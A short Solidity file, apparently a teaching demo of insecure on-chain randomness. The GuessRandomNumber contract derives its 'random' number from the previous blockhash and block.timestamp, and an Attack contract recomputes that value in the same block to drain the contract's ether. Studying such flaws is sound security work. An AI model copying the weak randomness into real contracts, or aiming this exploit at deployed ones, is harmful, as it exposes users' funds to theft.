// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// both contracts are executed in the same block.
// so both blockhash(block.number-1) & block.timestamp
// will be the same in both contract

contract GuessRandomNumber {
    uint balance = 0 ether;

    function guess(uint _guess) public {
        // blockhash(block.number-1) this returns hash of previous block
        uint ans = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        if (_guess == ans) {
            // console.log(_guess, ans);
            // console.log(address(this).balance);
            (bool sent, ) = msg.sender.call{value: balance}("");
            require(sent, "Failed to send ether");
        }
    }

    receive() external payable {
        balance += msg.value;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    uint balance = 0 ether;

    function attack(GuessRandomNumber guessRandomNumber) public {
        uint ans = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessRandomNumber.guess(ans);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        balance += msg.value;
    }
}
